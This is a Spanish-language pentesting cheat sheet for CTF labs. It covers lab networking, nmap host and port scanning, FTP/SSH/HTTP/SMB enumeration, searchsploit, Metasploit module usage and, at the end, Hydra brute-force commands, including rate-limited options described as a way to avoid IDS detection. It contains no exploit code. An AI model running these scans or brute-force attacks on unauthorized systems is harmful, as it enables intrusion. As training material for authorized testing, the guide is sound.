# üìñ BIBLIA DE PENTESTING 2.0 - GU√çA MEJORADA
*Metodolog√≠a Acad√©mica MIT - Ciberseguridad Avanzada*

---

## üéØ METODOLOG√çA FUNDAMENTAL DE PENTESTING

### Principios Acad√©micos Base
El pentesting profesional sigue una metodolog√≠a estructurada y repetible, basada en frameworks reconocidos como OWASP, NIST y PTES. Esta gu√≠a integra teor√≠a acad√©mica con pr√°ctica profesional de nivel √©lite.

**Marco Conceptual**: RECONOCIMIENTO ‚Üí ENUMERACI√ìN ‚Üí EXPLOTACI√ìN ‚Üí POST-EXPLOTACI√ìN ‚Üí DEFENSA

---

## üîç FASE 1: RECONOCIMIENTO INICIAL

### 1.0 Preparaci√≥n del Entorno de Herramientas

#### **Instalaci√≥n de Suite de Pentesting**
```bash
# Instala las herramientas m√°s comunes para pentesting en sistemas basados en Debian/Ubuntu
sudo apt update && sudo apt install -y nmap sqlmap burpsuite dirb whois dnsutils net-tools nikto metasploit-framework arp-scan ftp hydra john hashcat netcat-traditional zmap gobuster enum4linux smbclient seclists neofetch htop openssh-server git-dumper dirbuster wfuzz curl cloudflared
```

### 1.1 Preparaci√≥n del Entorno de Laboratorio y Conectividad

#### **Configuraci√≥n de Red en VirtualBox para Laboratorios CTF**

La correcta configuraci√≥n de la red es crucial. Cada modo tiene un prop√≥sito espec√≠fico.

| Modo de Red | Acceso a Internet | Acceso a Red Local (LAN) | Comunicaci√≥n Host ‚Üî VM | Comunicaci√≥n VM ‚Üî VM | Caso de Uso Principal |
| :--- | :---: | :---: | :---: | :---: | :--- |
| **NAT** | ‚úÖ | ‚ùå | ‚ö†Ô∏è (Con Port Forwarding) | ‚ùå | **Uso B√°sico:** La VM necesita internet pero debe estar aislada de la LAN. |
| **Red NAT** | ‚úÖ | ‚ùå | ‚úÖ | ‚úÖ | **Laboratorio Aislado con Internet:** Crea una sub-red interna para tus VMs, todas con salida a internet. |
| **Adaptador Puente** | ‚úÖ | ‚úÖ | ‚úÖ | ‚úÖ | **Simulaci√≥n Real ‚≠ê Caja Negra Parcial:** La VM es un dispositivo m√°s en tu red f√≠sica.  Ideal para descubrir VMs objetivo en la misma LAN. **CUIDADO:** Expone la VM a la red. |
| **Red Interna** | ‚ùå | ‚ùå | ‚ùå | ‚úÖ | **M√°ximo Aislamiento:** Para analizar malware o practicar ataques en un entorno 100% controlado sin conexi√≥n externa. ‚≠ê Caja Negra Avanzada: (Con router virtual). |
| **Adaptador Solo-Anfitri√≥n** | ‚ùå | ‚ùå | ‚úÖ | ‚úÖ | **‚≠ê CTF / Laboratorio Ideal:** Crea una red privada entre el anfitri√≥n y las VMs. Sin salida a internet, ideal para practicar de forma segura. |

**Nota sobre DHCP:** En los modos **Adaptador Puente** y **Solo-Anfitri√≥n**, puedes necesitar asignar una IP est√°tica. Si la VM no obtiene una IP, es posible que debas configurar la red manualmente en el sistema operativo de la VM, desactivando el cliente DHCP si es necesario.

# üïµÔ∏è‚Äç‚ôÇÔ∏è Niveles de Escenario + Tipos de Caja

| Nivel | Escenario de Red | Caja Blanca | Caja Gris | Caja Negra |
|-------|------------------|-------------|-----------|------------|
| **1** | **Misma red f√≠sica (LAN/Wi-Fi)** ‚Äì VM en *Adaptador Puente* o equipo real en la misma subred. | Se conocen IP, SO y credenciales; pruebas directas. | Se conoce IP y/o SO, pero no credenciales. | Solo se conoce que est√° en la misma red; se descubre IP/host con ARP o ping sweep. |
| **2** | **Subredes internas separadas** ‚Äì Router virtual (pfSense/OpenWRT) simulando redes distintas. | Se conocen rangos, topolog√≠a y credenciales. | Se conoce el rango destino, pero no credenciales. | Solo se conoce que existe otra subred; hay que descubrirla v√≠a router o pivot. |
| **3** | **IP p√∫blica en Internet** ‚Äì Hosting dedicado o servicio cloud (AWS, Azure, VPS, etc.). | IP, servicio y credenciales conocidas; acceso directo. | IP y servicio conocidos, credenciales desconocidas. | Solo dominio o pista m√≠nima; se obtiene IP por DNS/OSINT y luego se hace reconocimiento. |
| **4** | **PC de un compa√±ero (red distinta, fuera de tu LAN)** ‚Äì Acceso por Internet directo entre 2 equipos. | IP p√∫blica conocida, credenciales dadas. | IP p√∫blica conocida, credenciales desconocidas. | No se sabe nada; hay que descubrir la IP del compa√±ero y luego hacer reconocimiento y ataque. |

üìå **Notas r√°pidas para recordar:**

- **Caja Blanca:** toda la informaci√≥n relevante es conocida *(IP, SO, credenciales)*.  
- **Caja Gris:** parte de la informaci√≥n es conocida *(IP o SO, pero no credenciales)*.  
- **Caja Negra:** no se conoce nada m√°s all√° del objetivo general, requiere **descubrimiento y enumeraci√≥n completa**.  
- **Nivel 4:** es el m√°s cercano a un ataque real entre dos usuarios en distintas ubicaciones, y puede implicar **OSINT**, **ingenier√≠a social** o **t√©cnicas de descubrimiento avanzadas**.

#### **Gesti√≥n del Servicio SSH**
| Tarea | ‚≠ê Comando Esencial | Funci√≥n |
|-------|--------------------|---------|
| Habilitar SSH (temporal)   | `sudo systemctl start ssh` | Inicia servicio para la sesi√≥n actual. |
| Habilitar SSH (permanente) | `sudo systemctl enable ssh --now` | Arranca y habilita en el inicio. |
| Detener SSH                | `sudo systemctl stop ssh` | Detiene el servicio. |
| Deshabilitar SSH permanente| `sudo systemctl disable ssh` | Evita arranque autom√°tico. |
| Ver estado                 | `sudo systemctl status ssh` | Comprueba si est√° activo o fall√≥. |

#### **Conexi√≥n SSH a la M√°quina Objetivo (CTF)**
Una vez que identificas la IP de la m√°quina v√≠ctima y confirmas que el puerto 22 est√° abierto, el siguiente paso suele ser intentar una conexi√≥n SSH.

| Tarea | ‚≠ê Comando Esencial | Opciones Comunes |
| :--- | :--- | :--- |
| **Conexi√≥n B√°sica** | `ssh usuario@<IP_OBJETIVO>` | |
| **Especificar Puerto** | `ssh -p <PUERTO> usuario@<IP_OBJETIVO>` | `-p`: Si SSH no corre en el puerto est√°ndar 22. |
| **Usar Llave Privada** | `ssh -i /ruta/a/llave.pem usuario@<IP_OBJETIVO>` | `-i`: Para autenticaci√≥n con llaves en lugar de contrase√±a. |


#### Configuraci√≥n Manual de Red (Entorno de Laboratorio Local)

| Tarea | ‚≠ê Comando Esencial (Linux) | Comando Alternativo (Linux) | Comando Windows |
| :--- | :--- | :--- | :--- |
| Ver Nombres de Interfaz | `ip a` | `ifconfig` | `ipconfig /all` |
| Asignar IP Temporal | `sudo ip addr add <IP>/<CIDR> dev <interfaz>` | `sudo ifconfig <interfaz> <IP> netmask <M√°scara>` | `netsh interface ip set address name="<Interfaz>" static <IP> <M√°scara> <Gateway>` |
| Asignar IP Permanente | `sudo nano /etc/netplan/[archivo].yaml` (Ubuntu) | `sudo nano /etc/network/interfaces` (Debian) | Panel de Control ‚Üí Red |
| Aplicar Cambios Netplan | `sudo netplan apply` | - | - |

#### Tabla de Flags - Configuraci√≥n de Red

| Flag/Par√°metro | Comando      | Funci√≥n Acad√©mica                              | Fundamento T√©cnico                                |
|----------------|--------------|------------------------------------------------|---------------------------------------------------|
| `/all`         | ipconfig     | Informaci√≥n completa de todas las interfaces   | Incluye DNS, DHCP lease, MAC addresses           |
| `[IP]/[CIDR]`  | ip addr add  | Notaci√≥n CIDR para red y m√°scara               | /24 = 255.255.255.0, /16 = 255.255.0.0           |
| `dev`          | ip addr add  | Especifica dispositivo de red                  | Indica interfaz f√≠sica o virtual espec√≠fica      |
| `netmask`      | ifconfig     | M√°scara de subred en formato decimal punteado | Define porci√≥n de red vs host en direcci√≥n IP    |
| `static`       | netplan      | Configuraci√≥n est√°tica vs DHCP                | Direcci√≥n fija no asignada din√°micamente          |

#### Verificaci√≥n de Conectividad Objetivo

| Tarea                        | Linux / macOS              | Windows             | Funci√≥n y Desglose de Opciones                              |
|------------------------------|----------------------------|---------------------|--------------------------------------------------------------|
| Verificar si una IP responde | `ping [IP]`                | `ping [IP]`         | `-c [num]` (Linux), `-t` (Win), `-n [num]` (Win espec√≠fico) |
| Trazar ruta a un destino     | `traceroute [IP]`          | `tracert [IP]`      | `-n` (Linux), `-d` (Windows) - no resolver nombres         |
| Ver tabla de vecinos         | `ip n` / `arp -a`          | `arp -a`            | Muestra tabla ARP con MAC addresses                         |

#### Tabla de Flags - Conectividad

| Flag     | Comando     | Funci√≥n Acad√©mica                               | Fundamento T√©cnico                                  |
|----------|-------------|-------------------------------------------------|-----------------------------------------------------|
| `-c`     | ping        | Count - n√∫mero de paquetes ICMP a enviar       | Evita ping infinito en Linux                       |
| `-t`     | ping (Win)  | Till stopped - env√≠a hasta interrupci√≥n manual | Equivalente a ping sin par√°metros en Linux         |
| `-n`     | ping (Win)  | Number - cantidad espec√≠fica de paquetes       | Equivalente a `-c` en Linux/macOS                   |
| `-n`     | traceroute  | Numeric - muestra IPs sin resolver nombres     | Optimizaci√≥n de velocidad y precisi√≥n               |
| `-d`     | tracert     | No resolve - no resuelve direcciones a nombres | Equivalente a `-n` en Linux/macOS                   |

#### Reconocimiento Pasivo Inicial (OSINT)

| Tarea                        | Comando                    | Funci√≥n y Aplicaci√≥n Pr√°ctica                           |
|------------------------------|----------------------------|----------------------------------------------------------|
| Consultar info dominio       | `whois [dominio]`          | Informaci√≥n OSINT sin interacci√≥n directa               |
| Consultar DNS                | `nslookup` / `dig`         | Mapear infraestructura DNS y servicios asociados        |
| Consultas DNS espec√≠ficas    | `dig [dominio] MX`         | Servidores de correo                                     |
| Consultas DNS TXT            | `dig [dominio] TXT`        | Registros de texto (SPF, DKIM, verificaci√≥n)            |
| Transferencia de Zona            | `dig axfr @[servidor_ns] [dominio]`        | Extrae registros DNS completos (si est√° permitido).            |

#### Tabla de Flags - Reconocimiento DNS

| Flag/Par√°metro | Comando    | Funci√≥n Acad√©mica                               | Informaci√≥n Obtenida                                |
|----------------|------------|-------------------------------------------------|-----------------------------------------------------|
| `MX`           | dig        | Mail Exchange records                           | Servidores de correo del dominio                   |
| `TXT`          | dig        | Text records                                    | Pol√≠ticas SPF, DKIM, verificaciones de dominio     |
| `NS`           | dig        | Name Server records                             | Servidores DNS autoritativos                       |
| `A`            | dig        | Address records (por defecto)                   | Resoluci√≥n dominio a IPv4                          |
| `AAAA`         | dig        | IPv6 address records                            | Resoluci√≥n dominio a IPv6                          |
| `-x`           | dig        | Reverse DNS lookup                              | Resoluci√≥n IP a dominio                             |

### 1.2 Descubrimiento de Red y Hosts Activos

#### Escaneo de Descubrimiento de Hosts

| T√©cnica                      | ‚≠êComando                             | Funci√≥n y Aplicaci√≥n Pr√°ctica                              |
|------------------------------|------|--------------------------------------------------------------|
| Descubrimiento b√°sico        | `sudo nmap -sn [rango_red]`         | Identificar superficie de ataque disponible                 |
| Descubrimiento ARP (local)   | `arp-scan -l`                       | Descubrimiento Layer 2 para redes locales                   |
| Descubrimiento ARP con nmap  | `sudo nmap -PR 192.168.1.0/24`     | M√°s sigiloso que ICMP, dif√≠cil de detectar                  |
| Descubrimiento TCP SYN       | `sudo nmap -PS22,80,443 192.168.1.0/24` | Usar puertos comunes para descubrimiento                    |
| Descubrir hosts locales      | `sudo nmap -sn [Rango]`             | Ping Scan para identificar hosts activos                    |
| ARP pasivo/activo     | `sudo netdiscover -r [rango]`             | Escucha tr√°fico y env√≠a sondas en LAN.                    |

**Ejemplos Pr√°cticos**:
```bash
sudo netdiscover # Descubrimiento r√°pido
sudo netdiscover -r 192.168.1.0/24 # Con rango espec√≠fico
sudo arp-scan -l # Alternativa r√°pida con arp-scan
sudo nmap -sn 10.10.10.0/24 # Ping Scan est√°ndar con Nmap
# PROP√ìSITO ACAD√âMICO: Identificar superficie de ataque disponible
# FUNDAMENTO: Mapeo de topolog√≠a antes de enumeraci√≥n profunda
```

#### Tabla de Flags - Descubrimiento de Hosts

| Flag        | Comando | Funci√≥n Acad√©mica                               | Fundamento T√©cnico                                  |
|-------------|---------|------------------------------------------------|-----------------------------------------------------|
| `-sn`       | nmap    | Scan No port - solo descubrimiento de hosts   | Mapeo de topolog√≠a sin escaneo de puertos          |
| `-PR`       | nmap    | ARP Request scan                               | Descubrimiento Layer 2, m√°s efectivo en LAN        |
| `-PS`       | nmap    | TCP SYN Ping                                   | Usa puertos espec√≠ficos para descubrimiento        |
| `-l`        | arp-scan| Scan local network                             | Escanea red local usando protocolo ARP             |
| `-r`        | netdiscover | Rango de IP a escanear                 | Limita escaneo a subred.          |
| `22,80,443` | nmap    | Puerto list para TCP SYN ping                 | Puertos comunes que suelen estar abiertos          |

---

## üîç FASE 2: ENUMERACI√ìN DE SERVICIOS

### 2.1 Escaneo Completo de Puertos

#### Metodolog√≠a de Escaneo en Dos Fases (Eficiencia y Profundidad)

| Fase | ‚≠ê Comando Esencial | Prop√≥sito Acad√©mico |
| :--- | :--- | :--- |
| **Fase 1: R√°pida** | `nmap -p- --open -sS --min-rate 5000 -n -Pn <IP> -oG allPorts` | Descubre **TODOS** los puertos abiertos lo m√°s r√°pido posible. |
| **Fase 2: Detallada** | `nmap -p <puertos> -sC -sV <IP> -oN targeted` | Analiza en profundidad los servicios, versiones y scripts en los puertos encontrados. |

#### **Comando Consolidado (El m√°s com√∫n en CTFs)**
Este comando es un balance entre velocidad y detalle, ideal para la mayor√≠a de escenarios.
```bash
# ‚≠ê Escaneo de puertos, versiones, y scripts por defecto. El m√°s utilizado.
nmap -sC -sV -p- <IP> -oN scan_completo
```

#### Tabla de Flags - Escaneo de Puertos Nmap

| Flag         | Funci√≥n Acad√©mica                              | Fundamento T√©cnico                                    |
|--------------|------------------------------------------------|-------------------------------------------------------|
| `-p-`        | Escanear todos los 65,535 puertos TCP         | Cobertura completa de superficie de ataque           |
| `--open`     | Filtrar solo puertos en estado OPEN           | Eliminar ruido de puertos closed/filtered            |
| `-sS`        | SYN Scan (TCP Half-Open)                      | Sigiloso y eficiente, no completa handshake          |
| `-sC`        | ‚≠êScript scan - ejecuta scripts NSE por defecto | Enumeraci√≥n automatizada con scripts especializados  |
| `-sV`        | ‚≠êVersion detection - fingerprinting servicios  | Identificaci√≥n precisa para exploit selection        |
| `--min-rate` | Velocidad m√≠nima paquetes/segundo              | Control de agresividad del escaneo                   |
| `-n`         | Deshabilitar resoluci√≥n DNS                    | Optimizaci√≥n de velocidad                             |
| `-Pn`        | Omitir descubrimiento de host                  | Asumir activo, √∫til cuando ICMP est√° bloqueado       |
| `-oG`        | Output Grepeable                               | Formato para procesamiento automatizado              |
| `-oN`        | Output normal                                  | Formato legible para an√°lisis humano                 |
| `-A`         | Aggressive scan                                | Combinaci√≥n: -sV, -sC, -O, --traceroute              |
| `-O`         | OS Detection                                   | Fingerprinting de sistema operativo                  |
| `-T4`        | Timing template (aggressive)                   | Balance velocidad vs precisi√≥n                       |

#### Procesamiento Automatizado de Resultados (Ejemplo)
```bash
# Extrae los puertos abiertos del archivo grepeable y los formatea para el siguiente comando
cat allPorts | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ','
# DESGLOSE DEL PIPELINE:
# grep -oP '\d{1,5}/open' = Regex para extraer puertos con estado open
# awk '{print $1}' FS='/'  = Usar / como delimitador, extraer solo n√∫mero
# xargs                    = Conversi√≥n multilinea a linea √∫nica
# tr ' ' ','              = Transformar espacios a formato CSV
# RESULTADO ESPERADO: 21,22,139,445,3632
```


### 2.2 Enumeraci√≥n Profunda de Servicios

#### Verificaci√≥n de Conectividad por Puerto

| Herramienta | Comando                      | Prop√≥sito Acad√©mico                              |
|-------------|------------------------------|--------------------------------------------------|
| netcat      | `nc -zv [IP] [puerto]`       | Verificaci√≥n manual de servicios espec√≠ficos    |
| telnet      | `telnet [IP] [puerto]`       | Test de conectividad y banner grabbing          |

#### Tabla de Flags - Verificaci√≥n Manual

| Flag | Herramienta | Funci√≥n Acad√©mica                               | Fundamento T√©cnico                                |
|------|-------------|-------------------------------------------------|---------------------------------------------------|
| `-z` | netcat      | Zero-I/O mode (no transferir datos)            | Solo test de conectividad                        |
| `-v` | netcat      | Verbose (informaci√≥n detallada)                | Output detallado del estado de conexi√≥n          |

### 2.3 Enumeraci√≥n Espec√≠fica por Protocolo

### üìÅ FTP (Puerto 21) ‚Äî Enumeraci√≥n Completa

| T√©cnica                   | Comando/Acci√≥n                                                                 | Prop√≥sito Acad√©mico                                                                 |
|---------------------------|--------------------------------------------------------------------------------|-------------------------------------------------------------------------------------|
| Acceso An√≥nimo Manual     | `ftp <IP_objetivo>` ‚Üí usuario: `anonymous`, contrase√±a: `anonymous`           | Verificaci√≥n de configuraci√≥n insegura. Muy com√∫n en servidores mal configurados.  |
| Enumeraci√≥n Automatizada  | `nmap -p 21 --script ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-vuln* <IP>` | Uso de scripts NSE para detectar acceso an√≥nimo, vulnerabilidades y backdoors.     |

**Comandos dentro de sesi√≥n FTP**:
```bash
ftp> ls -la          # Listar archivos con permisos
ftp> dir             # Listar contenido del directorio
ftp> binary          # Modo binario para archivos
ftp> get [archivo]   # Descargar archivo
ftp> put [archivo]   # Subir archivo (si permitido)
ftp> passive         # Modo pasivo para firewalls
```

#### SSH (Puerto 22) - An√°lisis de Seguridad

| T√©cnica                     | Comando                                          | Prop√≥sito Acad√©mico                              |
|-----------------------------|--------------------------------------------------|--------------------------------------------------|
| Enumeraci√≥n de algoritmos   | `nmap -p 22 --script ssh-enum-algos [IP]`       | Identificar algoritmos criptogr√°ficos soportados |
| Enumeraci√≥n de usuarios     | `nmap -p 22 --script ssh-enum-users --script-args userdb=users.txt [IP]` | Enumeraci√≥n de usuarios del sistema |
| Banner grabbing manual      | `nc [IP] 22`                                     | Obtener informaci√≥n de versi√≥n directa           |

#### üîç HTTP/HTTPS (Puertos 80, 443) ‚Äî An√°lisis de Vulnerabilidades Web

| T√©cnica                   | Comando                                                                 | Prop√≥sito Acad√©mico                                               |
|---------------------------|-------------------------------------------------------------------------|-------------------------------------------------------------------|
| An√°lisis de Vulnerabilidades | `nikto -h http://<IP>`                                                  | Identificaci√≥n automatizada de vulnerabilidades web comunes.      |
| Escaneo detallado         | `nikto -h http://<IP> -C all`                                            | An√°lisis completo con todas las pruebas disponibles.              |
| Escaneo con proxy         | `nikto -h http://<IP> -useproxy http://127.0.0.1:8080`                   | An√°lisis v√≠a proxy para interceptaci√≥n y monitoreo.               |
| Banner Grabbing           | `curl -I http://<IP>`                                                    | Obtener cabeceras HTTP para identificar servidor y tecnolog√≠a.    |
| Fuzzing de Directorios    | `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` | Descubrir directorios y archivos ocultos mediante fuerza bruta.   |

#### Tabla de Flags - Nikto

| Flag | Funci√≥n Acad√©mica                               | Fundamento T√©cnico                                |
|------|-------------------------------------------------|---------------------------------------------------|
| `-h` | Host objetivo para escaneo                     | Especifica URL o IP del servidor web objetivo    |
| `-C` | Categor√≠a de pruebas                           | `all` ejecuta todas las pruebas disponibles      |
| `--useproxy` | Usar proxy para requests                   | Enrutamiento via Burp Suite para an√°lisis        |

#### üñß SMB/NetBIOS (Puertos 139, 445) ‚Äî Enumeraci√≥n Exhaustiva

| T√©cnica                   | Comando                                                                 | Prop√≥sito Acad√©mico                                                                 |
|---------------------------|-------------------------------------------------------------------------|-------------------------------------------------------------------------------------|
| Listado de Recursos       | `smbclient -L //<IP_objetivo> -N`                                       | Enumera los recursos compartidos (shares) sin necesidad de autenticaci√≥n.          |
| Conexi√≥n a Recursos       | `smbclient //<IP_objetivo>/<recurso> -N`                                | Acceso directo a recursos compartidos, √∫til para explorar contenido.               |
| Enumeraci√≥n Completa      | `enum4linux -a <IP_objetivo>`                                           | Extracci√≥n detallada de usuarios, shares, pol√≠ticas y configuraciones.             |
| Scripts NSE SMB           | `nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-vuln* <IP>`    | Enumeraci√≥n automatizada y detecci√≥n de vulnerabilidades con Nmap.                 |

#### Tabla de Flags - Enumeraci√≥n SMB

| Flag | Herramienta | Funci√≥n Acad√©mica                               | Fundamento T√©cnico                                |
|------|-------------|-------------------------------------------------|---------------------------------------------------|
| `-L` | smbclient   | List resources                                  | Enumera recursos compartidos disponibles         |
| `-N` | smbclient   | No password (null session)                     | Acceso sin credenciales                          |
| `-a` | enum4linux  | All enumeration                                 | Ejecuta todas las t√©cnicas de enumeraci√≥n        |

---

## üìä FASE 2B: AN√ÅLISIS DE PUERTOS, PROCESOS Y SERVICIOS

### 2B.1 An√°lisis Completo del Estado de Red

#### Vista General del Sistema

| Tarea                                      | Linux / macOS                     | Windows                           | Funci√≥n y Desglose de Opciones                        |
|--------------------------------------------|---------------------------------|---------------------------------|--------------------------------------------------------|
| Vista General: conexiones y puertos       | `sudo ss -tunap`                | `netstat -ano`                   | Lista completa de conexiones y puertos               |
| Vista General (m√©todo cl√°sico)            | `sudo netstat -tunap`           | `netstat -ano`                   | M√©todo tradicional, misma funci√≥n                    |
| Servicios en escucha √∫nicamente            | `sudo ss -tuln`                 | `netstat -ano | findstr "LISTENING"` | Ver servicios activos esperando conexiones         |
| Conexiones activas √∫nicamente             | `ss -tn state established`      | `netstat -an | findstr "ESTABLISHED"` | Conexiones en uso, ignora puertos en espera      |
| Solo sockets UDP                          | `ss -uan`                       | `netstat -anu`                   | A√≠sla tr√°fico UDP (DNS, DHCP, streaming)            |
| Buscar proceso que usa puerto espec√≠fico   | `sudo ss -tulnp | grep [PUERTO]` | `netstat -ano | findstr "[PUERTO]"` | Obtiene PID del proceso que ocupa el puerto        |
| Ver nombre proceso por PID                | `ps -p [PID] -o comm=`          | `tasklist /FI "PID eq [PID]"`   | Identifica programa antes de terminarlo              |
| Buscar sockets por nombre proceso         | `lsof -c [nombreProceso]`       | `tasklist | findstr "[proceso]"`<br/>`netstat -ano | findstr "[PID]"` | Flujo Windows para encontrar puertos por proceso |

#### Tabla de Flags - An√°lisis de Red del Sistema

| Flag | Comando     | Funci√≥n Acad√©mica                              | Fundamento T√©cnico                                |
|------|-------------|------------------------------------------------|---------------------------------------------------|
| `-t` | ss/netstat  | Solo sockets TCP                               | Filtrar protocolo de transporte espec√≠fico       |
| `-u` | ss/netstat  | Solo sockets UDP                               | Protocolo sin conexi√≥n para servicios espec√≠ficos|
| `-l` | ss/netstat  | Solo puertos "escucha" (Listening)            | Servicios activos esperando conexiones           |
| `-n` | ss/netstat  | Formato num√©rico (no resolver nombres)        | Optimizaci√≥n de velocidad, evita DNS lookup      |
| `-a` | ss/netstat  | Todos los sockets (escucha y establecidas)    | Vista completa del estado de red                 |
| `-p` | ss/netstat  | Mostrar Process ID y nombre                    | Correlaci√≥n socket-proceso para an√°lisis         |
| `-o` | netstat(Win)| Mostrar Process ID                             | Equivalente a `-p` en Linux                      |

### 2B.2 Gesti√≥n de Procesos y Liberaci√≥n de Puertos

#### Terminaci√≥n de Procesos

| Tarea                          | Linux / macOS              | Windows                    | Funci√≥n y Aplicaci√≥n                                 |
|--------------------------------|----------------------------|----------------------------|------------------------------------------------------|
| Liberar puerto matando proceso | `sudo kill -9 [PID]`       | `taskkill /PID [PID] /F`   | Termina proceso para liberar puerto                  |
| Verificaci√≥n remota de puerto  | `telnet [IP] [PUERTO]`     | `telnet [IP] [PUERTO]`     | Pantalla negra = abierto; error = cerrado           |

#### Tabla de Flags - Gesti√≥n de Procesos

| Flag/Par√°metro | Comando    | Funci√≥n Acad√©mica                               | Fundamento T√©cnico                                |
|----------------|------------|-------------------------------------------------|---------------------------------------------------|
| `-9`           | kill       | Se√±al SIGKILL (incondicional)                  | Terminaci√≥n forzada, no puede ser ignorada       |
| `/PID`         | taskkill   | Especifica Process ID a terminar               | Identificador √∫nico del proceso                   |
| `/F`           | taskkill   | Force - forzar terminaci√≥n                     | Equivalente a SIGKILL en Windows                 |

### 2B.3 Tabla Maestra de Conflictos de Puertos

| Puerto | Desarrollo Web y Datos               | Herramientas de Ataque / Apps Vulnerables | Herramientas de Defensa / Monitoreo y Ops | Redes/Protocolos |
|--------|------------------------------------|--------------------------------------------|--------------------------------------------|------------------|
| 21     | ‚Äî                                  | FTP Attacks, FTP Brute Force               | ‚Äî                                          | FTP File Transfer |
| 22     | SSH Development                    | SSH Tunneling, SSH Brute Force             | SSH Admin                                  | SSH Management   |
| 53     | ‚Äî                                  | DNS Tunneling, DNS Exfiltration            | DNS Monitoring                             | DNS              |
| 80     | HTTP Development                   | HTTP C2, Web Shells                        | HTTP Monitoring                            | HTTP             |
| 443    | HTTPS Development                  | HTTPS C2 Communications                    | SSL/TLS Services                           | HTTPS            |
| 445    | ‚Äî                                  | SMB Attacks, EternalBlue                   | SMB Monitoring                             | SMB/CIFS         |
| 1433   | SQL Server Development             | SQL Server Attacks                         | Database Monitoring                        | MS SQL Server    |
| 3000   | React, Next.js, Vue, Node.js, Express.js | OWASP Juice Shop                          | Grafana, Advisor                           | ‚Äî                |
| 3306   | MySQL Development                  | MySQL Attacks                              | MySQL Monitoring                           | MySQL            |
| 4444   | ‚Äî                                  | Reverse Shells, Meterpreter                | ‚Äî                                          | ‚Äî                |
| 5000   | Flask, Streamlit                   | Empire, Starkiller(API)                    | ‚Äî                                          | ‚Äî                |
| 5432   | PostgreSQL Development             | PostgreSQL Attacks                         | PostgreSQL Monitoring                      | PostgreSQL       |
| 5601   | ‚Äî                                  | ‚Äî                                          | Kibana Dashboard                           | ‚Äî                |
| 8000   | Django, Gunicorn, Jupyter Notebook | ‚Äî                                          | Kong(proxy), Portainer(HTTP), Splunk      | ‚Äî                |
| 8001   | ‚Äî                                  | ‚Äî                                          | Kong (Admin API)                           | ‚Äî                |
| 8080   | Tomcat, Servidores Java            | OWASP ZAP, Burp Suite, Web Goat           | Kibana, Jenkins, Apache Guacamole         | ‚Äî                |
| 8443   | ‚Äî                                  | ‚Äî                                          | Kong (HTTPS Proxy)                         | ‚Äî                |
| 8444   | ‚Äî                                  | ‚Äî                                          | Kong (HTTPS Admin API)                     | ‚Äî                |
| 9000   | ‚Äî                                  | ‚Äî                                          | TheHive                                    | ‚Äî                |
| 9090   | ‚Äî                                  | ‚Äî                                          | Prometheus                                 | ‚Äî                |
| 9200   | ‚Äî                                  | ‚Äî                                          | Elasticsearch                              | ‚Äî                |
| 9443   | ‚Äî                                  | ‚Äî                                          | Portainer (HTTPS)                          | ‚Äî                |
| 14268  | ‚Äî                                  | ‚Äî                                          | Jaeger Collector                           | ‚Äî                |
| 16686  | ‚Äî                                  | ‚Äî                                          | Jaeger UI                                  | ‚Äî                |
| 19999  | ‚Äî                                  | ‚Äî                                          | Netdata                                    | ‚Äî                |
---

## ‚öîÔ∏è FASE 3: EXPLOTACI√ìN

### 3.1 B√∫squeda y An√°lisis de Vulnerabilidades

#### B√∫squeda con Searchsploit (Base de Datos Local de Exploits)

| T√©cnica | ‚≠ê Comando Esencial | Prop√≥sito Acad√©mico |
| :--- | :--- | :--- |
| **B√∫squeda por Servicio** | `searchsploit <servicio> <versi√≥n>` | **El m√©todo m√°s r√°pido.** Correlaciona la versi√≥n del software con exploits conocidos en la base de datos de Exploit-DB. |
| Copiar Exploit | `searchsploit -m <ID_exploit>` | Copia el c√≥digo del exploit a tu directorio actual para an√°lisis y ejecuci√≥n. |

**Ejemplos Pr√°cticos**:
```bash
searchsploit samba 3.0.20
searchsploit distccd
searchsploit apache 2.4.41
# PROP√ìSITO ACAD√âMICO: Correlaci√≥n de versiones con vulnerabilidades conocidas
```

#### üß† Framework Metasploit ‚Äî Uso Acad√©mico Riguroso

| Fase                      | Comando/Acci√≥n                                                                 | Prop√≥sito Acad√©mico                                                                 |
|---------------------------|--------------------------------------------------------------------------------|-------------------------------------------------------------------------------------|
| Inicializaci√≥n            | `msfconsole -q`                                                                | Carga r√°pida y silenciosa del framework Metasploit.                                |
| B√∫squeda de M√≥dulos       | `search <criterio>`                                                            | Localizaci√≥n precisa de m√≥dulos de exploit, auxiliares o post-explotaci√≥n.         |
| Selecci√≥n de Exploit      | `use exploit/<ruta>`                                                           | Carga un m√≥dulo espec√≠fico para su posterior configuraci√≥n.                        |
| Configuraci√≥n de Objetivo | `set RHOSTS <IP>`<br>`set LHOST <IP>`<br>`set LPORT <puerto>`                  | Define IP v√≠ctima (`RHOSTS`), IP atacante (`LHOST`) y puerto de escucha (`LPORT`). |
| Verificaci√≥n de Par√°metros| `show options`<br>`show payloads`                                              | Muestra opciones requeridas y payloads compatibles con el exploit seleccionado.    |
| Ejecuci√≥n del Exploit     | `exploit` o `run`                                                              | Lanza el exploit contra el objetivo configurado.                                   |

**Ejemplos de B√∫squeda Especializados**:
```bash
search samba usermap
search distccd
search type:exploit platform:linux
# PROP√ìSITO: Localizaci√≥n precisa de m√≥dulos de explotaci√≥n
```




### 3.2 Ataques de Fuerza Bruta con Hydra

#### Configuraci√≥n de Listas de Usuarios
```bash
# Preparaci√≥n de listas de usuarios
echo -e "root\nadmin\nuser\ntest\nguest\nmakis\nadministrator" > users.txt
# PROP√ìSITO: Lista curada de usuarios comunes en sistemas objetivo
```

### üîê Ataques por Protocolo ‚Äî Fuerza Bruta con Hydra

| Protocolo        | Comando                                                                                                          | Prop√≥sito Acad√©mico                                                                 |
|------------------|------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------|
| **SSH (r√°pido)** | `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<IP>`                                              | Ataque automatizado contra autenticaci√≥n SSH usando diccionario de usuarios y claves. |
| **SSH (sigiloso)** | `hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -w 3 ssh://<IP>`                                      | Ataque con limitaci√≥n de velocidad para evitar detecci√≥n o bloqueo por IDS/IPS.    |
| **FTP (r√°pido)** | `hydra -L users.txt -P passwords.txt ftp://<IP>`                                                                 | Compromiso de servicio FTP mediante fuerza bruta.                                   |
